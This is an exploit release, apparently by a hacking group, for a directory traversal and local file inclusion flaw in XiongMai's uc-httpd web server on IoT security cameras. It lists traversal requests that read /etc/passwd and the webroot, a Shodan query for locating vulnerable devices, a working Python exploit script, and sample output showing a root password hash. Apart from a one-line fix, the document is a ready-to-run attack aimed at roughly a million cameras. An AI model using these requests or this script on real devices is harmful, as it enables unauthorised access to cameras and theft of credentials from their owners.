'''
______  ______   _____     ___   _____   _____   _____
| ___ \ | ___ \ |  _  |   |_  | |  ___| /  __ \ |_   _|
| |_/ / | |_/ / | | | |     | | | |__   | /  \/   | |
|  __/  |    /  | | | |     | | |  __|  | |       | |
| |     | |\ \  \ \_/ / /\__/ / | |___  | \__/\   | |
\_|     \_| \_|  \___/  \____/  \____/   \____/   \_/


_____   _   _   _____   _____   _____   _   _  ______   _____   _____  __   __
|_   _| | \ | | /  ___| |  ___| /  __ \ | | | | | ___ \ |_   _| |_   _| \ \ / /
| |   |  \| | \ `--.  | |__   | /  \/ | | | | | |_/ /   | |     | |    \ V /
| |   | . ` |  `--. \ |  __|  | |     | | | | |    /    | |     | |     \ /
_| |_  | |\  | /\__/ / | |___  | \__/\ | |_| | | |\ \   _| |_    | |     | |
\___/  \_| \_/ \____/  \____/   \____/  \___/  \_| \_|  \___/    \_/     \_/


[+]---------------------------------------------------------[+]
| Vulnerable Software:      uc-httpd                        |
| Vendor:                   XiongMai Technologies           |
| Vulnerability Type:       LFI, Directory Traversal        |
| Date Released:            03/04/2017                      |
| Released by:              keksec                          |
[+]---------------------------------------------------------[+]

uc-httpd is a HTTP daemon used by a wide array of IoT devices (primarily security cameras) which is vulnerable
to local file inclusion and directory traversal bugs. There are a few million total vulnerable devices, with
around one million vulnerable surviellence cameras.

The following request can be made to display the contents of the 'passwd' file:
GET ../../../../../etc/passwd HTTP/1.0

To display a directory listing, the following request can be made:
GET ../../../../../var/www/html/ HTTP/1.0
The above request would output the contents of the webroot directory as if 'ls' command was executed

The following shodan request can be used to display vulnerable systems:
product:uc-httpd

Here is a proof of concept (written by @sxcurity):
-------------------------------------------------------------------------------------------------------------
'''
#!/usr/bin/env python
import urllib2, httplib, sys

httplib.HTTPConnection._http_vsn = 10
httplib.HTTPConnection._http_vsm_str = 'HTTP/1.0'

print "[+] uc-httpd 0day exploiter [+]"
print "[+] usage: python " + __file__ + " http://<target_ip>"

host = sys.argv[1]
fd = raw_input('[+] File or Directory: ')

print "Exploiting....."
print '\n'
print urllib2.urlopen(host + '/../../../../..' + fd).read()

'''
-------------------------------------------------------------------------------------------------------------

Here is a live example of the exploit being ran:


root@127:~/dongs# python pwn.py http://127.0.0.1
[+] uc-httpd 0day exploiter [+]
[+] usage: python pwn.py http://<target_ip>
[+] File or Directory: /etc/passwd
Exploiting.....


root:absxcfbgXtb3o:0:0:root:/:/bin/sh

root@127:~/dongs# python pwn.py http://127.0.0.1
[+] uc-httpd 0day exploiter [+]
[+] usage: python pwn.py http://<target_ip>
[+] File or Directory: /proc/version
Exploiting.....


Linux version 3.0.8 (leixinyuan@localhost.localdomain) (gcc version 4.4.1 (Hisilicon_v100(gcc4.4-290+uclibc_0.9.32.1+eabi+linuxpthread)) ) #52 Fri Apr 22 12:33:57 CST 2016

root@127:~/dongs#
-------------------------------------------------------------------------------------------------------------


How to fix: Sanitize inputs, don't run your httpd as root!

[+]---------------------------------------------------------[+]
|                      CONTACT US:                          |
|                                                           |
| IRC:          irc.insecurity.zone (6667/6697) #insecurity |
| Twitter:      @insecurity                                 |
| Website:      insecurity.zone                             |
[+]---------------------------------------------------------[+]
'''